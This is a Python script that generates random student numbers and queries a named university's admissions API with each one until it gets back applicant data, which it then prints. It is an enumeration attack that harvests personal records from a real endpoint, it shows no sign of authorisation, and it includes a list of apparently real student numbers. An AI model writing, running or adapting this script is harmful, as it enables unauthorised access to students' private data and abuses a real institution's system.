import random
import requests
import time

# List of known valid student numbers (for reference, optional)
valid_student_numbers = [
    '9013246523', '9013166623', '9013606623', '9013661223', '9013733823',
    # ... (Add more if needed)
]

def generate_student_number():
    """Generate a random student number within the valid range of known numbers."""
    prefix = "901"  # Fixed prefix
    suffix = "23"   # Year suffix (2023)

    # Generate a random middle number within a range based on the known numbers
    middle_part = str(random.randint(268472, 383922)).zfill(6)  # Ensuring 6 digits

    student_number = prefix + middle_part + suffix

    return student_number

def query_api(student_number):
    """Query the API using the generated student number."""
    url = f"https://portal.umat.edu.gh/api-v1/live/admissions//api/Admission/GetApplicationBasicData?studentNumber={student_number}"
    
    try:
        response = requests.get(url)
        
        # Assuming the API returns status code 200 for valid numbers
        if response.status_code == 200:
            data = response.json()
            if data:  # Assuming a non-empty response means valid data
                return data
        else:
            print(f"Invalid student number: {student_number} - Status Code: {response.status_code}")
    
    except requests.RequestException as e:
        print(f"Error querying API: {e}")
    
    return None

def main():
    while True:
        # Generate a random student number
        student_number = generate_student_number()
        print(f"Generated student number: {student_number}")

        # Query the API with the generated student number
        result = query_api(student_number)
        
        # If a valid result is found, break the loop
        if result:
            print(f"Valid student data found for: {student_number}")
            print(result)
            break

        # Adding a small delay to prevent overwhelming the server
        time.sleep(0.5)

if __name__ == "__main__":
    main()
